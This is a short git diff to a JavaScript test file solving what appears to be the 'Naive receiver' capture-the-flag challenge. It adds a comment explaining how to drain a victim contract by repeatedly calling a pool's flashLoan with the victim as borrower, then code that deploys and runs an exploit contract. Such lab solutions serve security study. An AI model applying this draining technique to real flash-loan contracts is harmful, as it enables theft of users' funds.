@@ -45,6 +45,19 @@ describe('[Challenge] Naive receiver', function () {
         /** YOUR EXPLOIT GOES HERE */
         const accounts = await ethers.getSigners();
         const attacker = accounts[1];
+
+        /*
+         * We can call flashLoan method of the pool contract with victim.address as 
+         * borrower parameter. We can do it till the victim's funds are drained. 
+         * I did it in a proxy contract to make things happen in a single transaction 
+         * as suggested in the challenge. 
+         */
+        const expFactory = await ethers.getContractFactory("NaiveReceiverExp");
+        const expContract = await expFactory.connect(attacker).deploy(this.pool.address, this.receiver.address);
+
+        let tx = await expContract.attack();
+        await tx.wait();
+        console.log(tx);
     });
 
     after(async function () {
